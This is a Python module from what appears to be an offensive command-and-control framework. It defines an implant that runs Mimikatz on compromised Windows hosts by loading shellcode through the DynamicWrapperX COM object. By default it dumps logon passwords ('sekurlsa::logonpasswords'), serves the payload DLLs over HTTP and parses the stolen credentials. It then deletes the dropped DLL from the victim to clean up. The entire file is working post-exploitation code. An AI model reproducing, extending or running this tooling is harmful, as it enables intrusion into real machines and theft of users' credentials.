import core.implant
import core.job
import core.cred_parser
import string
import collections
import time
import uuid

class DynWrapXShellcodeJob(core.job.Job):
    def create(self):
        self.fork32Bit = True
        self.errstat = 0
        self.options.set("DLLUUID", uuid.uuid4().hex)
        self.options.set("MANIFESTUUID", uuid.uuid4().hex)
        self.options.set("SHIMX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX64UUID", uuid.uuid4().hex)
        self.options.set("MIMIX86UUID", uuid.uuid4().hex)
        self.options.set("MIMICMD", self.options.get("MIMICMD").lower())
        self.options.set("SHIMX86BYTES", self.make_arrDLL(self.options.get("SHIMX86DLL")))
        self.options.set("DIRECTORY", self.options.get('DIRECTORY').replace("\\", "\\\\").replace('"', '\\"'))

    def parse_mimikatz(self, data):
        cp = core.cred_parser.CredParse(self)
        self.mimi_output = cp.parse_mimikatz(data)

    def report(self, handler, data, sanitize = False):
        data = data.decode('latin-1')
        import binascii
        try:
            data = binascii.unhexlify(data)
            data = data.decode('utf-16-le')
        except:
            pass

        #print(data)
        task = handler.get_header(self.options.get("UUIDHEADER"), False)

        if task == self.options.get("DLLUUID"):
            handler.send_file(self.options.get("DYNWRAPXDLL"))
            return

        if task == self.options.get("MANIFESTUUID"):
            handler.send_file(self.options.get("DYNWRAPXMANIFEST"))
            return

        if task == self.options.get("SHIMX64UUID"):
            handler.send_file(self.options.get("SHIMX64DLL"))

        if task == self.options.get("MIMIX64UUID"):
            handler.send_file(self.options.get("MIMIX64DLL"))

        if task == self.options.get("MIMIX86UUID"):
            handler.send_file(self.options.get("MIMIX86DLL"))

        if len(data) == 0:
            handler.reply(200)
            return

        if "mimikatz(powershell) # " in data:
            self.parse_mimikatz(data)
            handler.reply(200)
            return

        if data == "Complete" and self.errstat != 1:
            super(DynWrapXShellcodeJob, self).report(handler, data)

        handler.reply(200)

    def make_arrDLL(self, path):
        import struct
        count = 0
        ret = ""
        with open(path, 'rb') as fileobj:
            for chunk in iter(lambda: fileobj.read(4), ''):
                if len(chunk) != 4:
                    break
                integer_value = struct.unpack('<I', chunk)[0]
                ret += hex(integer_value).rstrip("L") + ","
                if count % 20 == 0:
                    ret += "\r\n"

                count += 1
        return ret[:-1]

    def done(self):
        self.results = self.mimi_output if self.mimi_output else ""
        self.display()
        # deleting dynwrapx.dll, i hate this
        time.sleep(1)
        plugin = self.shell.plugins['implant/manage/exec_cmd']
        old_zombie = plugin.options.get("ZOMBIE")
        old_cmd = plugin.options.get("CMD")
        old_output = plugin.options.get("OUTPUT")
        plugin.options.set("ZOMBIE", self.options.get("ZOMBIE"))
        plugin.options.set("CMD", "del /f "+self.options.get("DIRECTORY")+"\\dynwrapx.dll & echo done")
        plugin.options.set("OUTPUT", "true")
        plugin.run()
        plugin.options.set("ZOMBIE", old_zombie)
        plugin.options.set("CMD", old_cmd)
        plugin.options.set("OUTPUT", old_output)

    def display(self):
        try:
            self.print_good(self.mimi_output)
        except:
            pass

class DynWrapXShellcodeImplant(core.implant.Implant):

    NAME = "Shellcode via Dynamic Wrapper X"
    DESCRIPTION = "Executes arbitrary shellcode using the Dynamic Wrapper X COM object"
    AUTHORS = ["zerosum0x0", "Aleph-Naught-" "gentilwiki"]
    STATE = "implant/inject/mimikatz_dynwrapx"

    def load(self):
        self.options.register("DIRECTORY", "%TEMP%", "writeable directory on zombie", required=False)

        self.options.register("MIMICMD", "sekurlsa::logonpasswords", "What Mimikatz command to run?", required=True)

        self.options.register("SHIMX86DLL", "data/bin/mimishim.dll", "relative path to mimishim.dll", required=True, advanced=True)
        self.options.register("SHIMX64DLL", "data/bin/mimishim.x64.dll", "relative path to mimishim.x64.dll", required=True, advanced=True)
        self.options.register("MIMIX86DLL", "data/bin/powerkatz32.dll", "relative path to powerkatz32.dll", required=True, advanced=True)
        self.options.register("MIMIX64DLL", "data/bin/powerkatz64.dll", "relative path to powerkatz64.dll", required=True, advanced=True)

        self.options.register("DYNWRAPXDLL", "data/bin/dynwrapx.dll", "relative path to dynwrapx.dll", required=True, advanced=True)
        self.options.register("DYNWRAPXMANIFEST", "data/bin/dynwrapx.manifest", "relative path to dynwrapx.manifest", required=True, advanced=True)

        self.options.register("UUIDHEADER", "ETag", "HTTP header for UUID", advanced=True)

        self.options.register("DLLUUID", "", "HTTP header for UUID", hidden=True)
        self.options.register("MANIFESTUUID", "", "UUID", hidden=True)
        self.options.register("SHIMX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX64UUID", "", "UUID", hidden=True)
        self.options.register("MIMIX86UUID", "", "UUID", hidden=True)

        self.options.register("SHIMX86BYTES", "", "calculated bytes for arr_DLL", hidden=True)

        self.options.register("SHIMX86OFFSET", "6202", "Offset to the reflective loader", advanced = True)

    def job(self):
        return DynWrapXShellcodeJob

    def make_arrDLL(self, path):
        import struct
        count = 0
        ret = ""
        with open(path, 'rb') as fileobj:
            for chunk in iter(lambda: fileobj.read(4), ''):
                if len(chunk) != 4:
                    break
                integer_value = struct.unpack('<I', chunk)[0]
                ret += hex(integer_value).rstrip("L") + ","
                if count % 20 == 0:
                    ret += "\r\n"

                count += 1

        return ret[:-1] # strip last comma

    def run(self):
        workloads = {}
        workloads["js"] = "data/implant/inject/mimikatz_dynwrapx.js"

        self.dispatch(workloads, self.job)
